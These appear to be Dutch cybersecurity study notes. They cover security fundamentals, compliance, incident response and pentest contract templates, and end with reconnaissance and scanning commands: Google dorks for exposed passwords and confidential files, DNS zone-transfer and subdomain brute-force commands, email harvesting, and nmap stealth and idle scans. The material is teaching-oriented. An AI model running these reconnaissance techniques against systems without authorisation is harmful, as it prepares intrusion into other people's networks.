# Cybersecurity Theorie Compleet

## Inhoudsopgave
1. [Inleiding tot Cybersecurity](#inleiding-tot-cybersecurity)
2. [Fundamentele Concepten](#fundamentele-concepten)
3. [Bedreigingen en Aanvalsvectoren](#bedreigingen-en-aanvalsvectoren)
4. [Netwerkbeveiliging](#netwerkbeveiliging)
5. [Cryptografie](#cryptografie)
6. [Identiteit en Toegangsbeheer](#identiteit-en-toegangsbeheer)
7. [Malware en Antimalware](#malware-en-antimalware)
8. [Penetration Testing Methodologie](#penetration-testing-methodologie)
9. [Footprinting en Reconnaissance](#footprinting-en-reconnaissance)
10. [Scanning Technieken](#scanning-technieken)
11. [Enumeration](#enumeration)
12. [Metasploit Framework](#metasploit-framework)
13. [Post-Exploitation](#post-exploitation)
14. [Web Application Security](#web-application-security)
15. [Social Engineering](#social-engineering)
16. [Incident Response](#incident-response)
17. [Digital Forensics](#digital-forensics)
18. [Compliance en Regelgeving](#compliance-en-regelgeving)
19. [Security Operations Center (SOC)](#security-operations-center-soc)
20. [Risk Management](#risk-management)
21. [Cybersecurity Terminologie](#cybersecurity-terminologie)
22. [Defense Strategieën](#defense-strategieën)
23. [Emerging Threats](#emerging-threats)

---

## Inleiding tot Cybersecurity

### Wat is Cybersecurity?
Cybersecurity is de praktijk van het beschermen van systemen, netwerken en programma's tegen digitale aanvallen. Deze aanvallen zijn meestal gericht op het verkrijgen van toegang tot, het wijzigen van of het vernietigen van gevoelige informatie; het afpersen van geld van gebruikers; of het verstoren van normale bedrijfsprocessen.

### De CIA Triad
De basis van cybersecurity wordt gevormd door drie fundamentele principes:

- **Confidentiality (Vertrouwelijkheid)**: Zorgt ervoor dat informatie alleen toegankelijk is voor geautoriseerde personen
- **Integrity (Integriteit)**: Zorgt ervoor dat informatie accuraat en compleet blijft
- **Availability (Beschikbaarheid)**: Zorgt ervoor dat informatie en systemen beschikbaar zijn wanneer ze nodig zijn

### Security/Convenience Dilemma
Het Security/Convenience Dilemma is een fundamenteel probleem in cybersecurity waarbij er een spanning bestaat tussen beveiliging en gebruiksgemak.

**Het Dilemma:**
- **Meer Security** = Minder Convenience
- **Meer Convenience** = Minder Security

**Voorbeelden:**
- **Wachtwoorden**: Complexe wachtwoorden zijn veiliger maar moeilijker te onthouden
- **Multi-Factor Authentication**: Verhoogt beveiliging maar voegt extra stappen toe
- **Firewall Regels**: Strikte regels zijn veiliger maar kunnen functionaliteit beperken
- **Encryptie**: Versleutelde data is veiliger maar kan prestaties beïnvloeden

**Balans Zoeken:**
- **Risk Assessment**: Bepaal acceptabel risico niveau
- **User Education**: Train gebruikers in security best practices
- **Technology Solutions**: Gebruik tools die security en convenience combineren
- **Policy Development**: Ontwikkel beleid dat beide aspecten in overweging neemt

### Cybersecurity Domeinen
1. **Network Security**: Bescherming van netwerkinfrastructuur
2. **Application Security**: Beveiliging van software en applicaties
3. **Information Security**: Bescherming van data en informatie
4. **Operational Security**: Processen en procedures voor beveiliging
5. **Disaster Recovery**: Herstel na incidenten
6. **End-user Education**: Training van gebruikers

---

## Fundamentele Concepten

### Security Architecture
Een goed ontworpen security architecture omvat:

- **Defense in Depth**: Meerdere lagen van beveiliging
- **Zero Trust Model**: "Never trust, always verify"
- **Least Privilege**: Minimale benodigde toegang
- **Separation of Duties**: Verdeling van verantwoordelijkheden

### Threat Modeling
Het proces van het identificeren, categoriseren en prioriteren van potentiële bedreigingen:

1. **Asset Identification**: Identificeren van waardevolle assets
2. **Threat Identification**: Herkennen van potentiële bedreigingen
3. **Vulnerability Assessment**: Evalueren van zwakke punten
4. **Risk Analysis**: Bepalen van risico's en impact

### Security Controls
Drie types van beveiligingscontroles:

- **Administrative Controls**: Beleid, procedures, training
- **Technical Controls**: Firewalls, antivirus, encryptie
- **Physical Controls**: Toegangscontrole, beveiligingscamera's

---

## Bedreigingen en Aanvalsvectoren

### Types van Bedreigingen

#### 1. Malware
- **Viruses**: Zelfreplicerende code die zich hecht aan bestanden
- **Worms**: Zelfstandige malware die zich verspreidt via netwerken
- **Trojans**: Schadelijke software vermomd als legitieme software
- **Ransomware**: Versleutelt bestanden en eist losgeld
- **Spyware**: Verzamelt informatie zonder toestemming
- **Adware**: Toont ongewenste advertenties

#### 2. Social Engineering
- **Phishing**: Valse e-mails die proberen gevoelige informatie te verkrijgen
- **Spear Phishing**: Gerichte phishing aanvallen
- **Whaling**: Phishing gericht op hooggeplaatste personen
- **Vishing**: Voice phishing via telefoon
- **Smishing**: SMS phishing
- **Pretexting**: Valse voorwendsels gebruiken voor informatie

#### 3. Network Attacks
- **DDoS (Distributed Denial of Service)**: Overbelasting van systemen
- **Man-in-the-Middle (MITM)**: Afluisteren van communicatie
- **Packet Sniffing**: Interceptie van netwerkverkeer
- **ARP Spoofing**: Vervalsen van MAC-adressen
- **DNS Spoofing**: Vervalsen van DNS-responses

#### 4. Application Attacks
- **SQL Injection**: Injectie van schadelijke SQL-code
- **Cross-Site Scripting (XSS)**: Injectie van client-side scripts
- **Cross-Site Request Forgery (CSRF)**: Ongewenste acties uitvoeren
- **Buffer Overflow**: Overschrijven van geheugenbuffers
- **Insecure Direct Object References**: Directe toegang tot objecten

### Attack Vectors
1. **Email**: Phishing, malware bijlagen
2. **Web Browsers**: Drive-by downloads, XSS
3. **Removable Media**: USB drives, CD's
4. **Social Media**: Social engineering, malware links
5. **Mobile Devices**: Malicious apps, SMS phishing
6. **Cloud Services**: Misconfiguraties, account takeover

---

## Netwerkbeveiliging

### Netwerkprotocollen en Beveiliging

#### TCP/IP Stack
- **Application Layer**: HTTP, HTTPS, FTP, SMTP
- **Transport Layer**: TCP, UDP
- **Network Layer**: IP, ICMP
- **Data Link Layer**: Ethernet, Wi-Fi

#### Beveiligingsprotocollen
- **TLS/SSL**: Transport Layer Security voor encryptie
- **IPSec**: Internet Protocol Security
- **WPA3**: Wi-Fi Protected Access 3
- **VPN**: Virtual Private Networks

### Firewalls
Types van firewalls:

1. **Packet Filtering Firewalls**: Filteren op basis van headers
2. **Stateful Firewalls**: Houdt verbindingsstatus bij
3. **Application Layer Firewalls**: Inspecteren applicatie-inhoud
4. **Next-Generation Firewalls**: Geavanceerde functies

### Intrusion Detection/Prevention Systems (IDS/IPS)
- **Signature-based**: Herkent bekende aanvallen
- **Anomaly-based**: Detecteert afwijkend gedrag
- **Behavior-based**: Leert van normaal gedrag

### Network Segmentation
- **VLANs**: Virtual Local Area Networks
- **Subnetting**: Verdeling van netwerkadressen
- **DMZ**: Demilitarized Zone voor publieke services
- **Micro-segmentation**: Fijnmazige netwerkverdeling

---

## Cryptografie

### Symmetrische Encryptie
Gebruikt dezelfde sleutel voor encryptie en decryptie:

- **AES (Advanced Encryption Standard)**: 128, 192, of 256-bit sleutels
- **DES (Data Encryption Standard)**: Verouderd, 56-bit sleutel
- **3DES (Triple DES)**: Drievoudige DES encryptie
- **Blowfish**: Snelle encryptie algoritme

### Asymmetrische Encryptie
Gebruikt publieke en private sleutels:

- **RSA**: Rivest-Shamir-Adleman algoritme
- **ECC (Elliptic Curve Cryptography)**: Efficiënter dan RSA
- **Diffie-Hellman**: Sleuteluitwisseling protocol

### Hash Functies
Eenrichtingsfuncties die data omzetten in vaste-lengte waarden:

- **MD5**: 128-bit hash (verouderd)
- **SHA-1**: 160-bit hash (verouderd)
- **SHA-256**: 256-bit hash (aanbevolen)
- **SHA-3**: Nieuwe standaard

### Digital Signatures
Verificatie van authenticiteit en integriteit:

- **RSA Signatures**: Gebaseerd op RSA encryptie
- **DSA (Digital Signature Algorithm)**: Alternatief voor RSA
- **ECDSA**: Elliptic Curve Digital Signature Algorithm

### Public Key Infrastructure (PKI)
Systeem voor het beheren van digitale certificaten:

- **Certificate Authority (CA)**: Uitgever van certificaten
- **Registration Authority (RA)**: Verifieert identiteit
- **Certificate Revocation List (CRL)**: Lijst van ingetrokken certificaten
- **Online Certificate Status Protocol (OCSP)**: Real-time certificaat status

---

## Identiteit en Toegangsbeheer

### Authentication (Authenticatie)
Verificatie van identiteit:

1. **Something you know**: Wachtwoorden, PINs
2. **Something you have**: Tokens, smart cards
3. **Something you are**: Biometrie (vingerafdruk, gezichtsherkenning)

### Multi-Factor Authentication (MFA)
Combinatie van meerdere authenticatiemethoden:

- **Two-Factor Authentication (2FA)**: Twee factoren
- **Time-based One-Time Password (TOTP)**: Tijdsgebaseerde codes
- **SMS-based**: Codes via SMS
- **Hardware tokens**: Fysieke tokens

### Authorization (Autorisatie)
Bepaling van toegangsrechten:

- **Role-Based Access Control (RBAC)**: Toegang op basis van rollen
- **Attribute-Based Access Control (ABAC)**: Toegang op basis van attributen
- **Discretionary Access Control (DAC)**: Eigenaar bepaalt toegang
- **Mandatory Access Control (MAC)**: Systeem bepaalt toegang

### Identity and Access Management (IAM)
Centraal beheer van identiteiten en toegang:

- **Single Sign-On (SSO)**: Eén login voor meerdere systemen
- **Federation**: Uitwisseling van identiteitsinformatie
- **Provisioning**: Automatisch aanmaken van accounts
- **Deprovisioning**: Automatisch verwijderen van accounts

---

## Malware en Antimalware

### Malware Classificatie

#### Op basis van verspreiding:
- **Viruses**: Hechten zich aan bestanden
- **Worms**: Zelfstandige verspreiding
- **Trojans**: Vermomd als legitieme software

#### Op basis van functionaliteit:
- **Backdoors**: Verborgen toegang
- **Keyloggers**: Registreren van toetsaanslagen
- **Rootkits**: Verbergen van malware
- **Botnets**: Netwerk van geïnfecteerde computers

### Antimalware Technieken

#### Signature-based Detection:
- **Virus Definitions**: Database van bekende malware
- **Heuristic Analysis**: Detectie van verdacht gedrag
- **Behavioral Analysis**: Monitoring van systeemgedrag

#### Modern Detection Methods:
- **Machine Learning**: AI-gebaseerde detectie
- **Sandboxing**: Isolatie van verdachte bestanden
- **Cloud-based Analysis**: Gecentraliseerde analyse
- **Endpoint Detection and Response (EDR)**: Real-time monitoring

### Malware Analysis
1. **Static Analysis**: Analyse zonder uitvoering
2. **Dynamic Analysis**: Analyse tijdens uitvoering
3. **Hybrid Analysis**: Combinatie van beide methoden

---

## Web Application Security

### OWASP Top 10 (2021)

1. **A01:2021 – Broken Access Control**
2. **A02:2021 – Cryptographic Failures**
3. **A03:2021 – Injection**
4. **A04:2021 – Insecure Design**
5. **A05:2021 – Security Misconfiguration**
6. **A06:2021 – Vulnerable and Outdated Components**
7. **A07:2021 – Identification and Authentication Failures**
8. **A08:2021 – Software and Data Integrity Failures**
9. **A09:2021 – Security Logging and Monitoring Failures**
10. **A10:2021 – Server-Side Request Forgery (SSRF)**

### Common Web Vulnerabilities

#### Injection Attacks:
- **SQL Injection**: Database manipulatie
- **NoSQL Injection**: NoSQL database aanvallen
- **Command Injection**: Systeemcommando uitvoering
- **LDAP Injection**: Directory service aanvallen

#### Cross-Site Attacks:
- **XSS (Cross-Site Scripting)**: Client-side code injectie
- **CSRF (Cross-Site Request Forgery)**: Ongewenste acties
- **Clickjacking**: UI redressing aanvallen

### Web Security Best Practices
- **Input Validation**: Valideren van alle invoer
- **Output Encoding**: Encoderen van uitvoer
- **Secure Coding**: Veilige programmeerpraktijken
- **Regular Updates**: Bijwerken van componenten
- **Security Headers**: HTTP security headers
- **HTTPS Everywhere**: Encryptie van alle communicatie

---

## Incident Response

### Incident Response Lifecycle

#### 1. Preparation
- **Response Plan**: Gedocumenteerd responsplan
- **Team Formation**: Incident response team
- **Tools and Resources**: Benodigde tools
- **Training**: Oefenen van procedures

#### 2. Identification
- **Detection**: Herkennen van incidenten
- **Classification**: Categoriseren van incidenten
- **Documentation**: Vastleggen van details
- **Notification**: Melden aan stakeholders

#### 3. Containment
- **Short-term Containment**: Onmiddellijke isolatie
- **Long-term Containment**: Duurzame isolatie
- **Evidence Preservation**: Bewaarmaken van bewijs
- **System Restoration**: Herstellen van systemen

#### 4. Eradication
- **Root Cause Analysis**: Oorzaak identificeren
- **Malware Removal**: Verwijderen van malware
- **Vulnerability Patching**: Patchen van kwetsbaarheden
- **System Hardening**: Versterken van beveiliging

#### 5. Recovery
- **System Restoration**: Herstellen van systemen
- **Data Recovery**: Herstellen van data
- **Service Restoration**: Herstellen van services
- **Monitoring**: Toezicht houden op herstel

#### 6. Lessons Learned
- **Post-Incident Review**: Evaluatie van respons
- **Documentation Update**: Bijwerken van procedures
- **Training Updates**: Verbeteren van training
- **Process Improvement**: Verbeteren van processen

### Incident Classification
- **Category 1**: Kritieke incidenten
- **Category 2**: Hoge prioriteit incidenten
- **Category 3**: Gemiddelde prioriteit incidenten
- **Category 4**: Lage prioriteit incidenten

---

## Digital Forensics

### Forensics Process
1. **Identification**: Identificeren van digitale bewijzen
2. **Preservation**: Bewaarmaken van bewijzen
3. **Collection**: Verzamelen van bewijzen
4. **Examination**: Onderzoeken van bewijzen
5. **Analysis**: Analyseren van bevindingen
6. **Presentation**: Presenteren van resultaten

### Types of Digital Evidence
- **Volatile Data**: RAM, processen, netwerkverbindingen
- **Non-volatile Data**: Harde schijven, USB drives
- **Network Evidence**: Logbestanden, netwerkverkeer
- **Mobile Evidence**: Smartphones, tablets

### Forensics Tools
- **Disk Imaging**: DD, FTK Imager
- **Memory Analysis**: Volatility, Rekall
- **Network Analysis**: Wireshark, tcpdump
- **Mobile Forensics**: Cellebrite, Oxygen Forensic

### Chain of Custody
Documentatie van bewijsbehandeling:
- **Who**: Wie heeft het bewijs behandeld
- **What**: Wat is er gedaan
- **When**: Wanneer is het gebeurd
- **Where**: Waar is het gebeurd
- **Why**: Waarom is het gedaan

---

## Compliance en Regelgeving

### Internationale Standaarden

#### ISO 27001
Information Security Management System:
- **Risk Assessment**: Risico-evaluatie
- **Security Controls**: Beveiligingscontroles
- **Continuous Improvement**: Continue verbetering
- **Management Commitment**: Management betrokkenheid

#### NIST Cybersecurity Framework
- **Identify**: Identificeren van assets en risico's
- **Protect**: Beschermen van systemen en data
- **Detect**: Detecteren van cybersecurity events
- **Respond**: Reageren op cybersecurity incidents
- **Recover**: Herstellen van cybersecurity events

### Europese Regelgeving

#### GDPR (General Data Protection Regulation)
- **Data Subject Rights**: Rechten van betrokkenen
- **Data Protection by Design**: Privacy by design
- **Data Breach Notification**: Meldplicht datalekken
- **Consent Management**: Toestemmingsbeheer
- **Data Processing Records**: Verwerkingsregister

#### NIS Directive
Network and Information Systems Directive:
- **Essential Services**: Essentiële diensten
- **Digital Service Providers**: Digitale dienstverleners
- **Incident Reporting**: Incident rapportage
- **Security Requirements**: Beveiligingseisen

### Nederlandse Wetgeving

#### Wet Digitale Overheid (WDO)
- **Digital Government**: Digitale overheid
- **Security Requirements**: Beveiligingseisen
- **Privacy Protection**: Privacybescherming

#### Telecommunicatiewet
- **Data Retention**: Bewaring van gegevens
- **Security Measures**: Beveiligingsmaatregelen
- **Incident Reporting**: Incident rapportage

---

## Security Operations Center (SOC)

### SOC Functies
- **Monitoring**: 24/7 monitoring van systemen
- **Detection**: Detecteren van bedreigingen
- **Analysis**: Analyseren van security events
- **Response**: Reageren op incidenten
- **Reporting**: Rapporteren van bevindingen

### SOC Team Rollen
- **SOC Manager**: Leidinggevende van het SOC
- **Security Analysts**: Analyseren van events
- **Incident Responders**: Reageren op incidenten
- **Threat Hunters**: Proactief zoeken naar bedreigingen
- **Forensics Specialists**: Digitaal forensisch onderzoek

### SOC Tools
- **SIEM (Security Information and Event Management)**: Splunk, QRadar
- **SOAR (Security Orchestration, Automation and Response)**: Phantom, Demisto
- **Threat Intelligence**: MISP, ThreatConnect
- **Vulnerability Management**: Nessus, Qualys
- **Endpoint Detection**: CrowdStrike, SentinelOne

### SOC Metrics
- **Mean Time to Detection (MTTD)**: Gemiddelde detectietijd
- **Mean Time to Response (MTTR)**: Gemiddelde responsetijd
- **False Positive Rate**: Percentage valse positieven
- **Incident Volume**: Aantal incidenten
- **Resolution Rate**: Oplossingspercentage

---

## Penetration Testing Methodologie

### Planning en Intake Meeting

#### Statement of Work (SOW)
Een Statement of Work is een contractueel document dat de scope, deliverables, tijdlijn en verwachtingen van een penetration test definieert.

**Contractuele Elementen:**
- **Parties**: Opdrachtgever en uitvoerende partij
- **Effective Date**: Startdatum van het contract
- **Term**: Duur van de overeenkomst
- **Scope of Work**: Gedetailleerde beschrijving van het werk
- **Deliverables**: Concrete resultaten en producten
- **Timeline**: Tijdslijn en milestones
- **Payment Terms**: Betalingsvoorwaarden
- **Legal Terms**: Juridische bepalingen

**SOW Structuur:**

**1. Executive Summary**
- Project overzicht
- Doelstellingen
- Verwachte resultaten

**2. Scope of Work**
- **Included Systems**: Specifieke systemen in scope
- **Excluded Systems**: Expliciet uitgesloten systemen
- **Testing Types**: Soorten tests (external, internal, web app, etc.)
- **Geographic Scope**: Geografische beperkingen
- **Time Constraints**: Tijdsbeperkingen

**3. Methodology**
- **Testing Approach**: Black box, white box, grey box
- **Tools and Techniques**: Toegestane tools
- **Testing Phases**: Fasen van de test
- **Quality Assurance**: Kwaliteitscontrole

**4. Deliverables**
- **Executive Summary**: Management overzicht
- **Technical Report**: Gedetailleerd technisch rapport
- **Presentation**: Presentatie van bevindingen
- **Raw Data**: Onbewerkte testdata
- **Remediation Guide**: Herstelrichtlijnen

**5. Timeline**
- **Project Duration**: Totale projectduur
- **Testing Phase**: Actieve testperiode
- **Report Delivery**: Rapportage deadline
- **Presentation**: Presentatie datum
- **Follow-up**: Opvolgingsafspraken

**6. Legal Agreements**
- **Confidentiality**: Geheimhoudingsverklaring
- **Liability**: Aansprakelijkheid
- **Data Protection**: Gegevensbescherming
- **Intellectual Property**: Intellectueel eigendom
- **Termination**: Beëindigingsvoorwaarden

**SOW Template:**
```
STATEMENT OF WORK
PENETRATION TESTING SERVICES

1. PARTIES
   Client: [Company Name]
   Contractor: [Security Company]
   Effective Date: [Date]
   Term: [Duration]

2. SCOPE OF WORK
   2.1 Target Systems
   - External IP Range: [IP Range]
   - Internal Network: [Network Details]
   - Web Applications: [Application List]
   - Mobile Applications: [App List]

   2.2 Testing Types
   - External Penetration Testing
   - Internal Penetration Testing
   - Web Application Testing
   - Social Engineering (if applicable)

   2.3 Exclusions
   - Production databases
   - Third-party systems
   - Out-of-scope applications

3. METHODOLOGY
   3.1 Testing Approach: Grey Box
   3.2 Tools: Industry standard tools
   3.3 Phases:
       - Reconnaissance
       - Vulnerability Assessment
       - Exploitation
       - Post-Exploitation
       - Reporting

4. DELIVERABLES
   4.1 Executive Summary (5 pages)
   4.2 Technical Report (50+ pages)
   4.3 Presentation (1 hour)
   4.4 Raw Data (CD/USB)
   4.5 Remediation Guide

5. TIMELINE
   - Project Start: [Date]
   - Testing Phase: [Date] - [Date]
   - Report Delivery: [Date]
   - Presentation: [Date]
   - Follow-up: [Date]

6. PAYMENT TERMS
   - Total Cost: [Amount]
   - Payment Schedule: [Details]
   - Expenses: [Policy]

7. LEGAL TERMS
   7.1 Confidentiality
   7.2 Liability Limitation
   7.3 Data Protection
   7.4 Intellectual Property
   7.5 Termination
```

#### Intake Meeting Vragen

**Organisatie Informatie:**
- Wat is de primaire business van de organisatie?
- Welke kritieke systemen zijn er?
- Zijn er specifieke compliance vereisten (GDPR, ISO 27001, etc.)?
- Wat is de huidige security posture?
- Hoeveel medewerkers heeft de organisatie?
- Welke afdelingen zijn er?
- Zijn er externe partners of leveranciers?

**Scope en Doelstellingen:**
- Wat is de exacte scope van de test?
- Zijn er systemen die expliciet uitgesloten moeten worden?
- Wat zijn de primaire security concerns?
- Zijn er recente security incidenten geweest?
- Wat is het doel van de penetration test?
- Zijn er specifieke compliance vereisten?
- Welke deliverables worden verwacht?

**Technische Details:**
- Welke IP ranges moeten getest worden?
- Zijn er specifieke domeinen of subdomeinen?
- Welke applicaties zijn in scope?
- Zijn er externe of interne tests nodig?
- Welke besturingssystemen worden gebruikt?
- Welke netwerkapparatuur is aanwezig?
- Zijn er cloud services in gebruik?
- Welke databases worden gebruikt?

**Logistieke Vragen:**
- Wie zijn de technische contactpersonen?
- Hoe wordt communicatie tijdens de test gehandhaafd?
- Zijn er specifieke tijdsvensters voor testing?
- Welke tools en technieken zijn toegestaan?
- Zijn er maintenance windows?
- Wie is de projectmanager?
- Hoe wordt escalatie gehandhaafd?

**Legal en Compliance:**
- Zijn er juridische overwegingen?
- Moeten er specifieke rapportage vereisten worden gevolgd?
- Zijn er data handling requirements?
- Zijn er NDAs ondertekend?
- Welke data mag niet worden aangeraakt?
- Zijn er specifieke testmethoden verboden?

### Rules of Engagement (ROE)

#### Definitie
Rules of Engagement zijn gedetailleerde richtlijnen die bepalen wat wel en niet is toegestaan tijdens een penetration test.

#### Belangrijke ROE Elementen

**Testing Scope:**
- **Included Systems**: Welke systemen zijn in scope
- **Excluded Systems**: Welke systemen zijn expliciet uitgesloten
- **Network Boundaries**: Welke netwerksegmenten mogen worden getest
- **Time Windows**: Wanneer mag er getest worden

**Allowed Techniques:**
- **Social Engineering**: Toegestane social engineering technieken
- **Physical Testing**: Fysieke toegang tot gebouwen
- **Denial of Service**: Zijn DoS aanvallen toegestaan?
- **Data Exfiltration**: Mag data worden gekopieerd?
- **System Modification**: Mogen systemen worden gewijzigd?

**Prohibited Activities:**
- **Destructive Testing**: Vernietigende tests
- **Production Data**: Aanraken van productie data
- **Third-party Systems**: Testen van externe systemen
- **Out-of-hours Testing**: Testen buiten kantooruren
- **Social Engineering**: Verboden social engineering technieken

**Communication Protocols:**
- **Incident Reporting**: Hoe worden incidenten gemeld
- **Escalation Procedures**: Escalatie procedures
- **Daily Updates**: Dagelijkse updates vereist?
- **Emergency Contacts**: Noodcontacten
- **Status Meetings**: Regelmatige status meetings

**Legal Considerations:**
- **Authorization**: Schriftelijke toestemming
- **Liability**: Aansprakelijkheid
- **Confidentiality**: Geheimhouding
- **Data Protection**: Gegevensbescherming
- **Jurisdiction**: Rechtsgebied

#### ROE Template

```
PENETRATION TEST RULES OF ENGAGEMENT

1. SCOPE OF WORK
   - Target Systems: [List of systems]
   - Network Ranges: [IP ranges]
   - Applications: [List of applications]
   - Exclusions: [Excluded systems]

2. TESTING WINDOWS
   - Business Hours: [Time range]
   - After Hours: [Time range]
   - Maintenance Windows: [Specific times]

3. ALLOWED TECHNIQUES
   - Vulnerability Scanning: YES/NO
   - Exploitation: YES/NO
   - Social Engineering: YES/NO
   - Physical Testing: YES/NO

4. PROHIBITED ACTIVITIES
   - Denial of Service: NO
   - Data Modification: NO
   - Production Impact: NO

5. COMMUNICATION
   - Daily Updates: Required
   - Incident Reporting: Immediate
   - Escalation: [Contact information]

6. DELIVERABLES
   - Executive Summary: Required
   - Technical Report: Required
   - Presentation: Required
   - Timeline: [Delivery dates]
```

### Pentest Fasen

#### 1. Pre-engagement
- **Contract Ondertekening**: SOW en legal agreements
- **Resource Planning**: Team samenstelling en tools
- **Environment Setup**: Test omgeving voorbereiden
- **Communication Setup**: Communicatiekanalen opzetten

#### 2. Reconnaissance (Information Gathering)
- **Passive Reconnaissance**: Open source intelligence
- **Active Reconnaissance**: Directe interactie met targets
- **Network Discovery**: Netwerk topologie mapping
- **Service Enumeration**: Dienst identificatie

#### 3. Vulnerability Assessment
- **Automated Scanning**: Vulnerability scanners
- **Manual Testing**: Handmatige verificatie
- **False Positive Analysis**: Verificatie van bevindingen
- **Risk Prioritization**: Prioriteren van kwetsbaarheden

#### 4. Exploitation
- **Proof of Concept**: Demonstreren van kwetsbaarheden
- **Privilege Escalation**: Verhogen van toegangsniveau
- **Persistence**: Behouden van toegang
- **Data Access**: Toegang tot gevoelige data

#### 5. Post-Exploitation
- **Lateral Movement**: Verplaatsen binnen het netwerk
- **Data Exfiltration**: Verzamelen van bewijs
- **System Compromise**: Volledige controle verkrijgen
- **Cleanup**: Verwijderen van sporen

#### 6. Reporting
- **Executive Summary**: Management overzicht
- **Technical Findings**: Gedetailleerde bevindingen
- **Risk Assessment**: Risico evaluatie
- **Remediation**: Aanbevelingen voor verbetering

---

## Footprinting en Reconnaissance

### Google Dorks

Google Dorks zijn geavanceerde zoekoperatoren die gebruikt worden om specifieke informatie te vinden via Google.

#### Basis Operators:
- **site:domain.com**: Zoek alleen op specifieke site
- **filetype:pdf**: Zoek naar specifieke bestandstypes
- **intitle:keyword**: Zoek in paginatitels
- **inurl:keyword**: Zoek in URL's
- **intext:keyword**: Zoek in paginatekst
- **cache:url**: Toon gecachte versie van pagina

#### Geavanceerde Operators:
- **"exact phrase"**: Zoek exacte zinnen
- **keyword1 OR keyword2**: OF zoekopdracht
- **keyword1 AND keyword2**: EN zoekopdracht
- **keyword1 -keyword2**: Uitsluiten van termen
- **~synonym**: Zoek naar synoniemen
- **..range**: Zoek binnen numerieke range

#### Praktische Voorbeelden:
```
site:target.com filetype:pdf
intitle:"login" inurl:admin
filetype:docx "confidential"
site:target.com intext:"password"
inurl:backup filetype:sql
site:target.com "index of" /admin
```

### DNS Tools en Technieken

#### NS Lookup en DNS Tools

**nslookup:**
```bash
# Basis DNS lookup
nslookup target.com

# Specifieke DNS server
nslookup target.com 8.8.8.8

# Reverse DNS lookup
nslookup 192.168.1.1

# MX record lookup
nslookup -type=MX target.com

# TXT record lookup
nslookup -type=TXT target.com
```

**dnsrecon:**
```bash
# Basis DNS enumeration
dnsrecon -d target.com

# Zone transfer attempt
dnsrecon -d target.com -t axfr

# Brute force subdomains
dnsrecon -d target.com -D /usr/share/wordlists/subdomains.txt -t brt

# Reverse DNS lookup
dnsrecon -r 192.168.1.0/24
```

**dnsdumpster:**
- Online tool voor DNS enumeration
- Toont subdomains, MX records, TXT records
- Gratis en geen registratie vereist

#### WHOIS Lookups

**Command Line:**
```bash
# Basis WHOIS lookup
whois target.com

# IP address WHOIS
whois 192.168.1.1

# Specifieke WHOIS server
whois -h whois.verisign-grs.com target.com
```

**Online Tools:**
- whois.net
- whois.domaintools.com
- whois.icann.org

### Reconnaissance Tools

#### BuiltWith
- **Functionaliteit**: Website technologie detectie
- **Gebruik**: Identificeer CMS, frameworks, analytics tools
- **URL**: builtwith.com
- **Output**: Lijst van gebruikte technologieën

#### Wappalyzer
- **Browser Extension**: Real-time technologie detectie
- **Functionaliteit**: Identificeer frameworks, CMS, servers
- **Installatie**: Chrome/Firefox extension store

#### WhatWeb
```bash
# Basis scan
whatweb target.com

# Verbose output
whatweb -v target.com

# Aggressive scan
whatweb -a 3 target.com

# Multiple targets
whatweb -i targets.txt
```

#### HTTrack
```bash
# Website mirroring
httrack target.com

# Specifieke opties
httrack target.com -O /tmp/mirror -v

# Exclude bepaalde bestanden
httrack target.com -O /tmp/mirror -N0 -r5 -%v
```

#### Sublist3r
```bash
# Basis subdomain enumeration
sublist3r -d target.com

# Met brute forcing
sublist3r -d target.com -b

# Output naar bestand
sublist3r -d target.com -o subdomains.txt

# Met engines
sublist3r -d target.com -e google,yahoo,bing
```

#### wafw00f
```bash
# WAF detection
wafw00f target.com

# Verbose output
wafw00f -v target.com

# Multiple targets
wafw00f -i targets.txt
```

#### theHarvester
```bash
# Email enumeration
theharvester -d target.com -b google

# Multiple sources
theharvester -d target.com -b google,bing,yahoo

# Output naar bestand
theharvester -d target.com -b google -f results.html

# LinkedIn enumeration
theharvester -d target.com -b linkedin
```

#### Netcraft
- **Functionaliteit**: Website informatie en geschiedenis
- **Features**: DNS records, hosting info, SSL certificates
- **URL**: netcraft.com

---

## Scanning Technieken

### TCP Scan Types

#### Full/Open Scan (TCP Connect)
```bash
nmap -sT target.com
```
- **Functionaliteit**: Volledige TCP handshake
- **Detectie**: Makkelijk detecteerbaar
- **Gebruik**: Wanneer stealth niet nodig is

#### Stealth/SYN Scan
```bash
nmap -sS target.com
```
- **Functionaliteit**: Alleen SYN packet versturen
- **Detectie**: Moeilijker detecteerbaar
- **Gebruik**: Default scan type, vereist root privileges

#### Xmas Tree Scan
```bash
nmap -sX target.com
```
- **Functionaliteit**: FIN, PSH, URG flags gezet
- **Detectie**: Kan door firewalls worden geblokkeerd
- **Gebruik**: Voor gesloten poorten

#### FIN Scan
```bash
nmap -sF target.com
```
- **Functionaliteit**: Alleen FIN flag gezet
- **Detectie**: Stealth techniek
- **Gebruik**: Voor gesloten poorten

#### Null Scan
```bash
nmap -sN target.com
```
- **Functionaliteit**: Geen flags gezet
- **Detectie**: Stealth techniek
- **Gebruik**: Voor gesloten poorten

#### Idle Scanning
```bash
nmap -sI zombie_ip target.com
```
- **Functionaliteit**: Gebruikt zombie host
- **Detectie**: Zeer stealth
- **Gebruik**: Wanneer anonimiteit cruciaal is

#### Idle Scanning Mechanisme

**Principe:**
Idle scanning gebruikt een "zombie" host om de target te scannen zonder directe communicatie tussen de scanner en target.

**Stappen:**
1. **Zombie Selection**: Kies een host met predictable IP ID
2. **IP ID Monitoring**: Monitor zombie's IP ID sequence
3. **Spoofed SYN**: Stuur SYN packet naar target met zombie's IP
4. **IP ID Check**: Controleer zombie's IP ID increment
5. **Port Status**: Bepaal target port status

**IP ID Fragmentatie:**
- **Incremental**: IP ID verhoogt met 1 per packet
- **Random**: IP ID is willekeurig (niet geschikt)
- **Constant**: IP ID blijft hetzelfde (niet geschikt)

**Zombie Behavior:**
```bash
# Check zombie IP ID behavior
nmap -sI zombie_ip -p 80 zombie_ip

# Expected responses:
# Open port: IP ID +2 (SYN/ACK + RST)
# Closed port: IP ID +1 (RST only)
# Filtered port: IP ID +0 (No response)
```

**Idle Scanning Tabel:**
| Target Port | Zombie Response | IP ID Change | Port Status |
|-------------|-----------------|--------------|-------------|
| Open | SYN/ACK + RST | +2 | Open |
| Closed | RST only | +1 | Closed |
| Filtered | No response | +0 | Filtered |

**Idle Scanning Voordelen:**
- **Anonymity**: Geen directe communicatie met target
- **Stealth**: Moeilijk te detecteren
- **Bypass**: Omzeilt firewalls en IDS

**Idle Scanning Nadelen:**
- **Zombie Required**: Nodig een geschikte zombie host
- **Slow**: Langzamer dan directe scans
